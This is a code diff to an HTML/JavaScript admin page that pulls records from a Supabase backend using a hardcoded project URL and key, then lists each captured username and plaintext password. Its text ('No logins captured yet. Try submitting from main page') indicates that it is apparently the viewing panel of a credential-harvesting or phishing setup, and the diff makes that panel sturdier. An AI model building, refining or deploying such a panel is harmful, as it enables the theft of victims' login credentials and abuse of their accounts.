@@ -28,7 +28,7 @@
       font-size: 16px;
     }
     button:hover { background:#0052b8; }
-    h1 { margin-bottom: 20px; }
+    .error { color: red; font-weight: bold; }
   </style>
 </head>
 <body>
@@ -36,27 +36,35 @@
   <button onclick="loadLogins()">🔄 Refresh</button>
   <div id="list"></div>
 
-  <!-- Supabase CDN - MUST be before your script -->
+  <!-- Supabase CDN -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
   <script>
-    // ================== SUPABASE CONFIG ==================
     const SUPABASE_URL = "https://kzhodlfnaoxfbmcmffuq.supabase.co";
-    const SUPABASE_ANON_KEY = "sb_publishable_82Z4St3QMsjIewnpr9i50w_Lxq0iTZo"; // ← Use your full key
+    const SUPABASE_ANON_KEY = "sb_publishable_82Z4St3QMsjIewnpr9i50w_Lxq0iTZo"; // ← Full key here
 
     let supabaseClient;
 
-    try {
-      const { createClient } = supabase;
-      supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-      console.log("✅ Supabase initialized in admin");
-    } catch (e) {
-      console.error("❌ Supabase init failed", e);
+    async function initSupabase() {
+      try {
+        const { createClient } = supabase;
+        supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        console.log("✅ Supabase initialized");
+        loadLogins();
+      } catch (e) {
+        console.error(e);
+        document.getElementById('list').innerHTML = `<p class="error">Supabase initialization failed. Check console (F12).</p>`;
+      }
     }
 
     async function loadLogins() {
       const list = document.getElementById('list');
       list.innerHTML = "<p>Loading data...</p>";
+
+      if (!supabaseClient) {
+        list.innerHTML = `<p class="error">Supabase not initialized yet.</p>`;
+        return;
+      }
 
       try {
         const { data, error } = await supabaseClient
@@ -67,7 +75,7 @@
         if (error) throw error;
 
         if (!data || data.length === 0) {
-          list.innerHTML = "<p>No data yet. Try logging in on the main page.</p>";
+          list.innerHTML = "<p>No logins captured yet. Try submitting from main page.</p>";
           return;
         }
 
@@ -75,21 +83,20 @@
         data.forEach(item => {
           html += `
             <div class="card">
-              <strong>Username / Email:</strong> ${item.username}<br>
+              <strong>Username:</strong> ${item.username}<br>
               <strong>Password:</strong> ${item.password}<br>
-              <small style="color:#666;">${new Date(item.timestamp).toLocaleString()}</small>
+              <small>${new Date(item.timestamp).toLocaleString()}</small>
             </div>`;
         });
-
         list.innerHTML = html;
       } catch (err) {
         console.error(err);
-        list.innerHTML = `<p style="color:red">Error loading data: ${err.message}</p>`;
+        list.innerHTML = `<p class="error">Error: ${err.message}</p>`;
       }
     }
 
-    // Load data when page opens
-    window.onload = loadLogins;
+    // Initialize when page loads
+    window.onload = initSupabase;
   </script>
 </body>
 </html>
